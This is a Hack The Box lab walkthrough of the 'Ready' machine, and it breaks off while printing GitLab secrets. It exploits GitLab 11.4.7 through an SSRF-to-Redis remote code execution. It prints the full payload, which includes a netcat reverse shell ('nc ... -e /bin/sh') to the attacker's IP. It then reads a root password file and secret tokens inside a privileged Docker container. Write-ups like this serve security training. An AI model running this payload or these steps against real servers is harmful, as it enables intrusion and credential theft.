# Hack the box - Ready

### IP: 10.10.10.220

## Check connectivity
```
┌──(kali㉿kali)-[~]
└─$ ping 10.10.10.220
PING 10.10.10.220 (10.10.10.220) 56(84) bytes of data.
64 bytes from 10.10.10.220: icmp_seq=1 ttl=63 time=309 ms
^C
--- 10.10.10.220 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 309.207/309.207/309.207/0.000 ms
```

## Enumeration with nmap
```
┌──(kali㉿kali)-[~]
└─$ nmap -A 10.10.10.220 
Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-20 12:37 EST
Nmap scan report for 10.10.10.220
Host is up (0.41s latency).
Not shown: 997 closed ports
PORT     STATE    SERVICE    VERSION
22/tcp   open     ssh        OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
1524/tcp filtered ingreslock
5080/tcp open     http       nginx
| http-robots.txt: 53 disallowed entries (15 shown)
| / /autocomplete/users /search /api /admin /profile 
| /dashboard /projects/new /groups/new /groups/*/edit /users /help 
|_/s/ /snippets/new /snippets/*/edit
| http-title: Sign in \xC2\xB7 GitLab
|_Requested resource was http://10.10.10.220:5080/users/sign_in
|_http-trane-info: Problem with XML parsing of /evox/about
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 92.68 seconds

```
## Check robots.txt and download
It seems like a gitlab server:
```
┌──(kali㉿kali)-[~]
└─$ curl 10.10.10.220:5080/robots.txt                                                                                                                                                                                                130 ⨯
# See http://www.robotstxt.org/robotstxt.html for documentation on how to use the robots.txt file
#
# To ban all spiders from the entire site uncomment the next two lines:
# User-Agent: *
# Disallow: /

# Add a 1 second delay between successive requests to the same server, limits resources used by crawler
# Only some crawlers respect this setting, e.g. Googlebot does not
# Crawl-delay: 1

# Based on details in https://gitlab.com/gitlab-org/gitlab-ce/blob/master/config/routes.rb, https://gitlab.com/gitlab-org/gitlab-ce/blob/master/spec/routing, and using application
User-Agent: *
Disallow: /autocomplete/users
Disallow: /search
Disallow: /api
Disallow: /admin
Disallow: /profile
Disallow: /dashboard
Disallow: /projects/new
Disallow: /groups/new
Disallow: /groups/*/edit
Disallow: /users
Disallow: /help
# Only specifically allow the Sign In page to avoid very ugly search results
Allow: /users/sign_in

# Global snippets
User-Agent: *
Disallow: /s/
Disallow: /snippets/new
Disallow: /snippets/*/edit
Disallow: /snippets/*/raw

# Project details
User-Agent: *
Disallow: /*/*.git
Disallow: /*/*/fork/new
Disallow: /*/*/repository/archive*
Disallow: /*/*/activity
Disallow: /*/*/new
Disallow: /*/*/edit
Disallow: /*/*/raw
Disallow: /*/*/blame
Disallow: /*/*/commits/*/*
Disallow: /*/*/commit/*.patch
Disallow: /*/*/commit/*.diff
Disallow: /*/*/compare
Disallow: /*/*/branches/new
Disallow: /*/*/tags/new
Disallow: /*/*/network
Disallow: /*/*/graphs
Disallow: /*/*/milestones/new
Disallow: /*/*/milestones/*/edit
Disallow: /*/*/issues/new
Disallow: /*/*/issues/*/edit
Disallow: /*/*/merge_requests/new
Disallow: /*/*/merge_requests/*.patch
Disallow: /*/*/merge_requests/*.diff
Disallow: /*/*/merge_requests/*/edit
Disallow: /*/*/merge_requests/*/diffs
Disallow: /*/*/project_members/import
Disallow: /*/*/labels/new
Disallow: /*/*/labels/*/edit
Disallow: /*/*/wikis/*/edit
Disallow: /*/*/snippets/new
Disallow: /*/*/snippets/*/edit
Disallow: /*/*/snippets/*/raw
Disallow: /*/*/deploy_keys
Disallow: /*/*/hooks
Disallow: /*/*/services
Disallow: /*/*/protected_branches
Disallow: /*/*/uploads/

```


## Check website on 5080
Effectively it's a gitlab server:
![Gitlab Server](./images/gitlab.png "Gitlab Server")

## Create user and login
![Gitlab Login](./images/gitlab_cedelasen.png "Gitlab Login")

## Check interesting paths in robots.txt
/autocomplete/users:
![Gitlab Users](./images/gitlab_users.png "Gitlab Users")
![Gitlab Users](./images/gitlab_users_firefox.png "Gitlab Users")

/help:
the update asap message seems like this version of gitlab has vulnerabilities
![Gitlab Help](./images/gitlab_help.png "Gitlab Help")

## Gitlab 11.4.7 vulnerability - Remote Code Execution
[Gitlab 11.4.7 - Remote Code Execution](https://www.exploit-db.com/exploits/49257)

![Gitlab Vulnerability](./images/gitlab_vuln.png "Gitlab Vulnerability")

following the instructions... with burpsuite we relogin and cath cookie and authenticity_token and execute the exploit. In that moment:

user: cedelasen

authenticity_token (url decoded): ZPzafQZZ96D8V7FBGLicJqnoikEdijO9m1grjsZn/by08vg0G04Ck7IGI/fm0HRmFmhGiQC8uW9Shjid/q8DbA==

cookie_session: _gitlab_session=1b997b73854f10006f8f921e88e1edf8

reverse shell:

```
┌──(kali㉿kali)-[~/htb-ready]
└─$ python3 49257.py
Debug => Token: ZPzafQZZ96D8V7FBGLicJqnoikEdijO9m1grjsZn/by08vg0G04Ck7IGI/fm0HRmFmhGiQC8uW9Shjid/q8DbA==
Debug => Cookie: _gitlab_session=1b997b73854f10006f8f921e88e1edf8; sidebar_collapsed=false
Debug => Namespace ID: 6
Debug => Payload encoded: utf8=%E2%9C%93&authenticity_token=ZPzafQZZ96D8V7FBGLicJqnoikEdijO9m1grjsZn%2Fby08vg0G04Ck7IGI%2Ffm0HRmFmhGiQC8uW9Shjid%2Fq8DbA%3D%3D&project%5Bci_cd_only%5D=false&project%5Bname%5D=mlcsTRxa&project%5Bnamespace_id%5D=6&project%5Bpath%5D=mlcsTRxa&project%5Bdescription%5D=mlcsTRxa&project%5Bvisibility_level%5D=20&=project%5Binitialize_with_readme%5D&project%5Bimport_url%5D=git%3A%2F%2F%5B0%3A0%3A0%3A0%3A0%3Affff%3A127.0.0.1%5D%3A6379%2F%0A+multi%0A+sadd+resque%3Agitlab%3Aqueues+system_hook_push%0A+lpush+resque%3Agitlab%3Aqueue%3Asystem_hook_push+%22%7B%5C%22class%5C%22%3A%5C%22GitlabShellWorker%5C%22%2C%5C%22args%5C%22%3A%5B%5C%22class_eval%5C%22%2C%5C%22open%28%27%7Cnc+10.10.14.133+4444+-e+%2Fbin%2Fsh%27%29.read%5C%22%5D%2C%5C%22retry%5C%22%3A3%2C%5C%22queue%5C%22%3A%5C%22system_hook_push%5C%22%2C%5C%22jid%5C%22%3A%5C%22ad52abc5641173e217eb2e52%5C%22%2C%5C%22created_at%5C%22%3A1513714403.8122594%2C%5C%22enqueued_at%5C%22%3A1513714403.8129568%7D%22%0A+exec%0A+exec%0A+exec%0A%2Ftest%2FmlcsTRxa.git
listening on [any] 4444 ...
connect to [10.10.14.133] from (UNKNOWN) [10.10.10.220] 48408

```

## Change terminal
```
...
python3 -c "import pty; pty.spawn('/bin/bash')"
git@gitlab:~/gitlab-rails/working$
```

## Get the user flag (check users from http://10.10.10.220:5080/autocomplete/users)
```
git@gitlab:~/gitlab-rails/working$ cd /home
cd /home
git@gitlab:/home$ ls
ls
dude
git@gitlab:/home$ cd dude
cd dude
git@gitlab:/home/dude$ ls -la
ls -la
total 24
drwxr-xr-x 2 dude dude 4096 Dec  7 16:58 .
drwxr-xr-x 1 root root 4096 Dec  2 10:45 ..
lrwxrwxrwx 1 root root    9 Dec  7 16:58 .bash_history -> /dev/null
-rw-r--r-- 1 dude dude  220 Aug 31  2015 .bash_logout
-rw-r--r-- 1 dude dude 3771 Aug 31  2015 .bashrc
-rw-r--r-- 1 dude dude  655 May 16  2017 .profile
-r--r----- 1 dude git    33 Dec  2 10:46 user.txt
git@gitlab:/home/dude$ cat user.txt
cat user.txt
e1e30b052b6ec0670698805d745e7682
```
## To be able to clean the terminal
```
git@gitlab:~/home$ set | grep TERM
set | grep TERM
GIT_TERMINAL_PROMPT=0
TERM=dumb
git@gitlab:~/home$ export TERM=xterm
export TERM=xterm
```

## Once shell its gained
We should execute an enumeration script

## Check SO
```
git@gitlab:~$ uname -a
uname -a
Linux gitlab.example.com 5.4.0-40-generic #44-Ubuntu SMP Tue Jun 23 00:01:04 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
```

## Check if its a docker container
It seems like a lot of commands are not availaible so it could be a docker container, we can check it:
```
git@gitlab:~$ cat /proc/1/cgroup
cat /proc/1/cgroup
12:rdma:/
11:pids:/docker/7eb263389e5eea068ad3d0c208ea4dd02ba86fa0b2ebd44f63adc391351fba6d
10:freezer:/docker/7eb263389e5eea068ad3d0c208ea4dd02ba86fa0b2ebd44f63adc391351fba6d
9:cpuset:/docker/7eb263389e5eea068ad3d0c208ea4dd02ba86fa0b2ebd44f63adc391351fba6d
8:devices:/docker/7eb263389e5eea068ad3d0c208ea4dd02ba86fa0b2ebd44f63adc391351fba6d
7:blkio:/docker/7eb263389e5eea068ad3d0c208ea4dd02ba86fa0b2ebd44f63adc391351fba6d
6:net_cls,net_prio:/docker/7eb263389e5eea068ad3d0c208ea4dd02ba86fa0b2ebd44f63adc391351fba6d
5:memory:/docker/7eb263389e5eea068ad3d0c208ea4dd02ba86fa0b2ebd44f63adc391351fba6d
4:hugetlb:/docker/7eb263389e5eea068ad3d0c208ea4dd02ba86fa0b2ebd44f63adc391351fba6d
3:cpu,cpuacct:/docker/7eb263389e5eea068ad3d0c208ea4dd02ba86fa0b2ebd44f63adc391351fba6d
2:perf_event:/docker/7eb263389e5eea068ad3d0c208ea4dd02ba86fa0b2ebd44f63adc391351fba6d
1:name=systemd:/docker/7eb263389e5eea068ad3d0c208ea4dd02ba86fa0b2ebd44f63adc391351fba6d
0::/system.slice/containerd.service

```
Check: [Escaping Docker Privileged Containers](https://medium.com/better-programming/escaping-docker-privileged-containers-a7ae7d17f5a1)

Check: [Understanding Docker container escapes](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)

## Check available commands
```
git@gitlab:~/git-data/repositories/cedelasen/linenum$ compgen -c | sort -u
compgen -c | sort -u
!
.
2to3
2to3-3.4
:
GraphicsMagick-config
GraphicsMagickWand-config
[
[[
]]
addpart
alertmanager
alias
apt
apt-cache
apt-cdrom
apt-config
apt-get
apt-key
apt-mark
arch
asciidoctor
asciidoctor-safe
awk
base32
base64
basename
bash
bashbug
bg
bind
bootctl
break
builtin
bundle
bundler
bunzip2
busctl
bzcat
bzcmp
bzdiff
bzegrep
bzfgrep
bzgrep
bzip2
bzip2recover
bzless
bzmore
c_rehash
caller
captoinfo
case
cat
catchsegv
cautious-launcher
cd
chage
chattr
chcon
chef-apply
chef-client
chef-shell
chef-solo
chef-zero
chfn
chgrp
chmod
chown
chpst
chrt
chsh
cksum
clear
clear_console
clusterdb
cmp
comm
command
commonmarker
compgen
compile_et
complete
compopt
compose
console
continue
coproc
cp
createdb
createlang
createuser
csplit
curl
cut
dash
date
dd
deb-systemd-helper
deb-systemd-invoke
debconf
debconf-apt-progress
debconf-communicate
debconf-copydb
debconf-escape
debconf-set-selections
debconf-show
declare
delpart
derb
df
diff
diff3
digest
dir
dircolors
dirname
dirs
disown
dmesg
dnsdomainname
do
domainname
done
dpkg
dpkg-deb
dpkg-divert
dpkg-maintscript-helper
dpkg-query
dpkg-split
dpkg-statoverride
dpkg-trigger
dropdb
droplang
dropuser
du
dumpsexp
easy_install-3.4
echo
ecpg
edit
editor
egrep
elif
else
emtail
enable
env
erb
erubis
esac
eval
ex
exec
exit
expand
expiry
export
expr
factor
faillog
fallocate
false
fc
ffi-yajl-bench
fg
fgrep
fi
find
findmnt
flock
fmt
fold
for
free
function
funzip
gem
genbrk
gencfu
gencnval
gendict
generate-api
genrb
getconf
getent
getopt
getopts
git
git-cvsserver
git-linguist
git-receive-pack
git-shell
git-upload-archive
git-upload-pack
gitaly
gitaly-ssh
github-markup
gitlab-ctl
gitlab-healthcheck
gitlab-logrotate-wrapper
gitlab-mon
gitlab-pages
gitlab-psql
gitlab-rails
gitlab-rake
gitlab-unicorn-wrapper
gitlab-workhorse
gitlab-zip-cat
gitlab-zip-metadata
gm
go-crond
gpasswd
gpg
gpg-agent
gpg-connect-agent
gpg-error
gpg-zip
gpgconf
gpgme-tool
gpgparsemail
gpgrt-config
gpgscm
gpgsm
gpgsplit
gpgtar
gpgv
grep
groups
gss-client
gunzip
gzexe
gzip
hamlit
hash
head
help
helpztags
history
hmac256
hostid
hostname
hostnamectl
htmldiff
httparty
httpclient
i386
iconv
icuinfo
id
idle3
idle3.4
if
in
infocmp
infotocap
initdb
install
ionice
ipcmk
ipcrm
ipcs
irb
ischroot
jemalloc.sh
jeprof
jobs
join
journalctl
k5srvutil
kadmin
kbxutil
kdestroy
kill
kinit
klist
knife
kpasswd
ksu
kswitch
ktutil
kvno
last
lastb
lastlog
ldd
ldiff
let
libpng-config
libpng16-config
licensee
line
linguist
link
linux32
linux64
ln
local
locale
localectl
localedef
logger
login
loginctl
logname
logout
ls
lsattr
lsblk
lscpu
lsipc
lslocks
lslogins
lspgpot
lzcat
lzma
lzmadec
lzmainfo
mail_room
makeconv
makedepend
mapfile
mattermost
mawk
mcookie
md5sum
md5sum.textutils
mesg
mkdir
mkfifo
mknod
mktemp
more
mount
mountpoint
mpicalc
mv
namei
nano
nawk
nc
nc.traditional
netcat
networkctl
newgrp
nice
nisdomainname
nl
node_exporter
nohup
nokogiri
nproc
nsenter
numfmt
oauth
od
ohai
oid2name
omnibus-ctl
openssl
org-ruby
pager
partx
passwd
paste
pathchk
pcre2grep
pcre2test
pcregrep
pcretest
perl
perl5.22.1
pg
pg_archivecleanup
pg_basebackup
pg_controldata
pg_ctl
pg_dump
pg_dumpall
pg_isready
pg_receivexlog
pg_recvlogical
pg_resetxlog
pg_restore
pg_rewind
pg_standby
pg_test_fsync
pg_test_timing
pg_upgrade
pg_xlogdump
pgbench
pgrep
pico
pidof
pinky
pip3
pip3.4
pirb
pkgdata
pkill
pldd
pmap
png-fix-itxt
pngfix
popd
posix-spawn-benchmark
postgres
postgres_exporter
postmaster
pr
premailer
print
printenv
printf
prlimit
prometheus
prometheus-storage-migrator
prometheus1
prometheus2
pruby
ps
psql
ptx
pushd
pwd
pwdx
pydoc3
pydoc3.4
python3
python3.4
python3.4m
pyvenv
pyvenv-3.4
rackup
rails
rake
raven
rbash
rbtrace
rcp
rdoc
read
readarray
readlink
readonly
realpath
redcarpet
redcloth
redis-benchmark
redis-check-aof
redis-check-rdb
redis-cli
redis-sentinel
redis-server
redis_exporter
registry
registry-api-descriptor-template
reindexdb
remote_syslog
rename.ul
renice
reset
resizepart
restclient
return
rev
rgrep
ri
rlogin
rm
rmdir
rmsgcat
rmsgfmt
rmsginit
rmsgmerge
rnano
rotp
rougify
rsh
rspec
rst2html.py
rst2latex.py
rst2man.py
rst2odt.py
rst2odt_prepstyles.py
rst2pseudoxml.py
rst2s5.py
rst2xetex.py
rst2xml.py
rstpep2html.py
rsync
rtail
rubocop
ruby
ruby-parse
ruby-prof
ruby-prof-check-trace
ruby-rewrite
ruby_parse
ruby_parse_extract_error
run-mailcap
run-parts
runcon
runit
runit-init
runsv
runsvchdir
runsvdir
runsvdir-start
rview
rvim
rxgettext
safe_yaml
sass
sass-convert
savelog
sclient
scp
script
scriptreplay
scss
sdiff
sed
see
select
select-editor
sensible-browser
sensible-editor
sensible-pager
seq
serverspec-init
set
setarch
setsid
setterm
setup
sftp
sg
sh
sh.distrib
sha1sum
sha224sum
sha256sum
sha384sum
sha512sum
shift
shopt
shred
shuf
sidekiq
sidekiqctl
sim_client
skill
slabtop
sleep
slogin
snice
sort
source
split
sprockets
ssh
ssh-add
ssh-agent
ssh-argv0
ssh-copy-id
ssh-keygen
ssh-keyscan
stat
stdbuf
stty
su
sum
suspend
sv
svlogd
symlink_ctl_cmds
sync
systemctl
systemd
systemd-analyze
systemd-ask-password
systemd-cat
systemd-cgls
systemd-cgtop
systemd-delta
systemd-detect-virt
systemd-escape
systemd-inhibit
systemd-machine-id-setup
systemd-notify
systemd-path
systemd-resolve
systemd-run
systemd-stdio-bridge
systemd-tmpfiles
systemd-tty-ask-password-agent
tabs
tac
tail
tailf
tar
taskset
tee
tempfile
test
then
thor
tic
tilt
time
timedatectl
timeout
times
tload
toe
top
touch
tput
tr
trap
true
truncate
tset
tsort
tty
type
typeset
tzselect
uconv
ulimit
umask
umount
unalias
uname
uncompress
unexpand
unicorn
unicorn_rails
uniq
unlink
unlzma
unset
unshare
until
unxz
unzip
unzipsfx
update-alternatives
update_rubygems
uptime
users
utmpdump
utmpset
uuclient
uuid
vacuumdb
vacuumlo
vdir
vi
view
vim
vim.basic
vimdiff
vimtutor
vmstat
w
w.procps
wait
wall
watch
watchgnupg
wc
wdctl
wget
whereis
which
while
who
whoami
x86_64
xargs
xmlcatalog
xmllint
xsltproc
xxd
xz
xzcat
xzdec
yes
ypdomainname
zcat
zcmp
zdiff
zdump
zegrep
zfgrep
zforce
zgrep
zipgrep
zipinfo
zless
zmore
znew
{
}

```

## Check IP with available commands
```
git@gitlab:~/git-data/repositories/cedelasen/linenum$ hostname -I | awk '{print $1}'
$1}'name -I | awk '{print  
172.19.0.2
```

## Printenv
```
git@gitlab:~/gitlab-rails/working$ printenv
printenv
BUNDLER_ORIG_PATH=/opt/gitlab/bin:/opt/gitlab/embedded/bin:/bin:/usr/bin
ICU_DATA=/opt/gitlab/embedded/share/icu/current
MANPATH=/opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/unicorn-5.1.0/man
GEM_HOME=/opt/gitlab/embedded/lib/ruby/gems/2.4.0
prometheus_multiproc_dir=/dev/shm/gitlab/sidekiq
BUNDLER_ORIG_MANPATH=BUNDLER_ENVIRONMENT_PRESERVER_INTENTIONALLY_NIL
BUNDLER_ORIG_GEM_HOME=BUNDLER_ENVIRONMENT_PRESERVER_INTENTIONALLY_NIL
LD_PRELOAD=/opt/gitlab/embedded/lib/libjemalloc.so
BUNDLER_ORIG_BUNDLER_VERSION=BUNDLER_ENVIRONMENT_PRESERVER_INTENTIONALLY_NIL
GIT_TERMINAL_PROMPT=0
BUNDLER_ORIG_BUNDLER_ORIG_MANPATH=BUNDLER_ENVIRONMENT_PRESERVER_INTENTIONALLY_NIL
RACK_ENV=production
BUNDLER_ORIG_RUBYLIB=BUNDLER_ENVIRONMENT_PRESERVER_INTENTIONALLY_NIL
prometheus_run_dir=/dev/shm/gitlab/sidekiq
BUNDLER_ORIG_RUBYOPT=BUNDLER_ENVIRONMENT_PRESERVER_INTENTIONALLY_NIL
PATH=/opt/gitlab/embedded/lib/ruby/gems/2.4.0/bin:/opt/gitlab/bin:/opt/gitlab/embedded/bin:/bin:/usr/bin
GID=998
PWD=/var/opt/gitlab/gitlab-rails/working
BUNDLER_ORIG_GEM_PATH=BUNDLER_ENVIRONMENT_PRESERVER_INTENTIONALLY_NIL
GITLAB_PATH_OUTSIDE_HOOK=/opt/gitlab/embedded/lib/ruby/gems/2.4.0/bin:/opt/gitlab/bin:/opt/gitlab/embedded/bin:/bin:/usr/bin
TZ=:/etc/localtime
EXECJS_RUNTIME=Disabled
SHLVL=1
HOME=/var/opt/gitlab
BUNDLE_GEMFILE=/opt/gitlab/embedded/service/gitlab-rails/Gemfile
RAILS_ENV=production
BUNDLER_ORIG_BUNDLE_GEMFILE=/opt/gitlab/embedded/service/gitlab-rails/Gemfile
PYTHONPATH=/opt/gitlab/embedded/lib/python3.4/site-packages
GEM_PATH=/opt/gitlab/embedded/lib/ruby/gems/2.4.0:/var/opt/gitlab/.gem/ruby/2.4.0
UID=998
SIDEKIQ_MEMORY_KILLER_MAX_RSS=2000000
BUNDLER_ORIG_BUNDLE_BIN_PATH=BUNDLER_ENVIRONMENT_PRESERVER_INTENTIONALLY_NIL
RUBYOPT=-rbundler/setup
BUNDLE_BIN_PATH=/opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/bundler-1.16.2/exe/bundle
BUNDLER_ORIG_RB_USER_INSTALL=BUNDLER_ENVIRONMENT_PRESERVER_INTENTIONALLY_NIL
RUBYLIB=/opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/bundler-1.16.2/lib
BUNDLER_VERSION=1.16.2
_=/usr/bin/printenv
```

## Check proccess running with root but working with non-root files
```
git@gitlab:~/gitlab-rails/working$ ps aux | grep root
ps aux | grep root
root           1  0.0  0.0  18044  2628 ?        Ss   Dec21   0:01 /bin/bash /assets/wrapper
root          12  0.0  0.0   4388  1032 ?        S    Dec21   0:00 runsvdir -P /opt/gitlab/service log: ...........................................................................................................................................................................................................................................................................................................................................................................................................
root          19  0.0  0.0   4236   600 ?        Ss   Dec21   0:00 runsv sshd
root          20  0.0  0.0   4380   728 ?        S    Dec21   0:00 svlogd -tt /var/log/gitlab/sshd
root          21  0.0  0.1  65504  4396 ?        S    Dec21   0:00 /usr/sbin/sshd -D -f /assets/sshd_config -e
root         452  0.0  0.0   4236   632 ?        Ss   Dec21   0:00 runsv nginx
root         453  0.0  0.0   4236   608 ?        Ss   Dec21   0:00 runsv gitaly
root         454  0.0  0.0   4236   760 ?        Ss   Dec21   0:00 runsv redis
root         455  0.0  0.0   4236   752 ?        Ss   Dec21   0:00 runsv redis-exporter
root         456  0.0  0.0   4236   616 ?        Ss   Dec21   0:00 runsv postgres-exporter
root         457  0.0  0.0   4236   660 ?        Ss   Dec21   0:00 runsv gitlab-workhorse
root         458  0.0  0.0   4236   700 ?        Ss   Dec21   0:00 runsv sidekiq
root         459  0.0  0.0   4236   616 ?        Ss   Dec21   0:00 runsv node-exporter
root         460  0.0  0.0   4236   664 ?        Ss   Dec21   0:00 runsv postgresql
root         461  0.0  0.0   4236   716 ?        Ss   Dec21   0:00 runsv alertmanager
root         462  0.0  0.0   4236   628 ?        Ss   Dec21   0:00 runsv prometheus
root         463  0.0  0.0   4236   612 ?        Ss   Dec21   0:00 runsv logrotate
root         464  0.0  0.0   4236   616 ?        Ss   Dec21   0:00 runsv unicorn
root         465  0.0  0.0   4236   628 ?        Ss   Dec21   0:00 runsv gitlab-monitor
root         466  0.0  0.0   4380   604 ?        S    Dec21   0:00 svlogd -tt /var/log/gitlab/redis
root         467  0.0  0.0   4380   628 ?        S    Dec21   0:00 svlogd -tt /var/log/gitlab/nginx
root         469  0.0  0.1  42808  4592 ?        Ss   Dec21   0:00 nginx: master process /opt/gitlab/embedded/sbin/nginx -p /var/opt/gitlab/nginx
root         470  0.0  0.0   4380   700 ?        S    Dec21   0:00 svlogd -tt /var/log/gitlab/postgresql
root         471  0.0  0.0   4380   608 ?        S    Dec21   0:00 svlogd -tt /var/log/gitlab/node-exporter
root         472  0.0  0.0   4380   604 ?        S    Dec21   0:00 svlogd -tt /var/log/gitlab/gitlab-workhorse
root         473  0.0  0.0   4380   688 ?        S    Dec21   0:00 svlogd -tt /var/log/gitlab/sidekiq
root         474  0.0  0.0   4380   608 ?        S    Dec21   0:00 svlogd -tt /var/log/gitlab/redis-exporter
root         475  0.0  0.0   4380   616 ?        S    Dec21   0:00 svlogd -tt /var/log/gitlab/unicorn
root         476  0.0  0.0   4380   604 ?        S    Dec21   0:00 svlogd -tt /var/log/gitlab/prometheus
root         477  0.0  0.0   4380   608 ?        S    Dec21   0:00 svlogd -tt /var/log/gitlab/logrotate
root         478  0.0  0.0   4380   688 ?        S    Dec21   0:00 svlogd -tt /var/log/gitlab/gitlab-monitor
root         479  0.0  0.0   4380   596 ?        S    Dec21   0:00 svlogd -tt /var/log/gitlab/postgres-exporter
root         480  0.0  0.0   4380   624 ?        S    Dec21   0:00 svlogd -tt /var/log/gitlab/gitaly
root         481  0.0  0.0   4380   600 ?        S    Dec21   0:00 svlogd -tt /var/log/gitlab/alertmanager
root         599  0.0  0.0  18028  2576 ?        S    Dec21   0:00 /bin/bash /opt/gitlab/bin/gitlab-ctl tail
root         600  0.0  0.1  96432  6688 ?        Sl   Dec21   0:06 /opt/gitlab/embedded/bin/ruby /opt/gitlab/embedded/bin/omnibus-ctl gitlab /opt/gitlab/embedded/service/omnibus-ctl* tail
root         629  0.0  0.0   4500   680 ?        S    Dec21   0:00 sh -c find -L /var/log/gitlab -type f -not -path '*/sasl/*' | grep -E -v '(config|lock|@|gzip|tgz|gz)' | xargs tail --follow=name --retry
root         632  0.0  0.0   4672  1084 ?        S    Dec21   0:00 xargs tail --follow=name --retry
root         633  0.0  0.0   4404   696 ?        S    Dec21   0:02 tail --follow=name --retry /var/log/gitlab/nginx/current /var/log/gitlab/nginx/error.log /var/log/gitlab/nginx/gitlab_error.log /var/log/gitlab/nginx/gitlab_access.log /var/log/gitlab/nginx/access.log /var/log/gitlab/gitaly/current /var/log/gitlab/gitaly/state /var/log/gitlab/redis/current /var/log/gitlab/redis/state /var/log/gitlab/redis-exporter/current /var/log/gitlab/redis-exporter/state /var/log/gitlab/postgres-exporter/current /var/log/gitlab/postgres-exporter/state /var/log/gitlab/gitlab-shell/gitlab-shell.log /var/log/gitlab/gitlab-workhorse/current /var/log/gitlab/gitlab-workhorse/state /var/log/gitlab/sidekiq/current /var/log/gitlab/sidekiq/state /var/log/gitlab/node-exporter/current /var/log/gitlab/node-exporter/state /var/log/gitlab/postgresql/current /var/log/gitlab/postgresql/state /var/log/gitlab/gitlab-rails/application.log /var/log/gitlab/gitlab-rails/grpc.log /var/log/gitlab/gitlab-rails/sidekiq_exporter.log /var/log/gitlab/gitlab-rails/gitlab-rails-db-migrate-2020-07-08-08-52-42.log /var/log/gitlab/gitlab-rails/api_json.log /var/log/gitlab/gitlab-rails/production_json.log /var/log/gitlab/gitlab-rails/sidekiq.log /var/log/gitlab/gitlab-rails/production.log /var/log/gitlab/gitlab-rails/gitlab-rails-db-migrate-2020-12-04-14-12-34.log /var/log/gitlab/alertmanager/current /var/log/gitlab/alertmanager/state /var/log/gitlab/prometheus/current /var/log/gitlab/prometheus/state /var/log/gitlab/sshd/current /var/log/gitlab/logrotate/current /var/log/gitlab/logrotate/state /var/log/gitlab/unicorn/current /var/log/gitlab/unicorn/state /var/log/gitlab/unicorn/unicorn_stdout.log /var/log/gitlab/unicorn/unicorn_stderr.log /var/log/gitlab/gitlab-monitor/current /var/log/gitlab/gitlab-monitor/state
root      172020  0.0  0.0   4500   848 ?        Ss   Dec21   0:00 /bin/sh /opt/gitlab/embedded/bin/gitlab-logrotate-wrapper
root      173438  0.0  0.0   4372   796 ?        S    Dec21   0:00 sleep 3000
git       260483  0.0  0.0  22932  1936 pts/16   S+   00:22   0:00 grep root

```
maybe we can check:
- /opt...
- /opt/gitlab...
- /var/log...
- /var/log/gitlab...

## Check directory /opt
Two directories inside:
- backup:
- gitlab
```
git@gitlab:/opt/backup$ ls -la
ls -la
total 112
drwxr-xr-x 2 root root  4096 Dec  7 09:25 .
drwxr-xr-x 1 root root  4096 Dec  1 16:23 ..
-rw-r--r-- 1 root root   872 Dec  7 09:25 docker-compose.yml
-rw-r--r-- 1 root root 15092 Dec  1 16:23 gitlab-secrets.json
-rw-r--r-- 1 root root 79639 Dec  1 19:20 gitlab.rb
```
```
git@gitlab:/opt/backup$ cat docker-compose.yml
cat docker-compose.yml
version: '2.4'

services:
  web:
    image: 'gitlab/gitlab-ce:11.4.7-ce.0'
    restart: always
    hostname: 'gitlab.example.com'
    environment:
      GITLAB_OMNIBUS_CONFIG: |
        external_url 'http://172.19.0.2'
        redis['bind']='127.0.0.1'
        redis['port']=6379
        gitlab_rails['initial_root_password']=File.read('/root_pass')
    networks:
      gitlab:
        ipv4_address: 172.19.0.2
    ports:
      - '5080:80'
      #- '127.0.0.1:5080:80'
      #- '127.0.0.1:50443:443'
      #- '127.0.0.1:5022:22'
    volumes:
      - './srv/gitlab/config:/etc/gitlab'
      - './srv/gitlab/logs:/var/log/gitlab'
      - './srv/gitlab/data:/var/opt/gitlab'
      - './root_pass:/root_pass'
    privileged: true
    restart: unless-stopped
    #mem_limit: 1024m

networks:
  gitlab:
    driver: bridge
    ipam:
      config:
        - subnet: 172.19.0.0/16

```
root_pass?
```
git@gitlab:/opt/backup$ cat /root_pass
cat /root_pass
YG65407Bjqvv9A0a8Tm_7w
git@gitlab:/opt/backup$ su root
su root
Password: YG65407Bjqvv9A0a8Tm_7w

su: Authentication failure
git@gitlab:/opt/backup$ su dude
su dude
Password: YG65407Bjqvv9A0a8Tm_7w

su: Authentication failure
```
nah...
```
git@gitlab:/opt/backup$ cat gitlab-secrets.json
cat gitlab-secrets.json
{
  "gitlab_workhorse": {
    "secret_token": "/HvvEvI/T33qyvK1U4jmnfH7fGxzySlzuhewkOR9Zk0="
  },
  "gitlab_shell": {
    "secret_token": "bad62f769ebf4f96f0114e406fa4605eb25cffd8b629bcff8419bb9078df53b42a219186a19d889a2dfb4f10eb65e6cdc3d784cf70f07c3c29947fc6f1523c14"
  },
  "gitlab_rails": {
    "secret_key_base": "b7c70c02d37e37b14572f5387919b00206d2916098e3c54147f9c762d6bef2788a82643d0c32ab1cdb315753d6a4e59271cddf9b41f37c814dd7d256b7a2f353",
    "db_key_base": "eaa32eb7018961f9b101a330b8a905b771973ece8667634e289a0383c2ecff650bb4e7b1a6034c066af2f37ea3ee103227655c33bc17c123c99f421ee0776429",
    "otp_key_base": "b30e7b1e7e65c31d70385c47bc5bf48cbe774e39492280df7428ce6f66bc53ec494d2fbcbf9b49ec204b3ba741261b43cdaf7a191932f13df1f5bd6018458e56",
